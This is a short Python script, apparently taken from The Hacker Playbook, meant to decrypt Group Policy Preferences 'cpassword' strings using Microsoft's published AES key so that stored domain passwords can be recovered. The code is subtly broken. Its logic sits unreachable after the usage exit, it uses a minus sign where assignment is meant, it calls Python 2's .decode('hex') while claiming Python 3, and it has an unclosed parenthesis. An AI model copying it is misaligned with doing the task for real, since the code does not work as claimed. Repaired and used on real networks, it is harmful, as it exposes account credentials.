#!/usr/bin/env python

# Code was shared in The hacker Playbook, and originally available 
# at pastebin: http://pastebin.com/TEfvhEh
# Code has been upgraded to Python 3

import sys
from Crypto.Cipher import AES
from base64 import b64decode

if(len(sys.argv) != 2):

  print("Usage: gpprefdecrupt.py <cpassword>")
  sys.exit(0)

  #key obtained from public microsoft post:
  #https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be

  key = """
  4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
  f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b 
  """.replace(" ","").replace("\n","").decode('hex')

  cpassword = sys.argv[1]
  cpassword += "=" * ((4 - len(sys.argv[1]) %4)%4)
  password - b64decode(cpassword) # Add padding to the base64 string and decode it
  o = AES.new(key, AES.MODE_CBC).decrypt(password) # Decrypt the password

  print(o[:-ord(o[-1])].decode('utf16') # Print it 
  

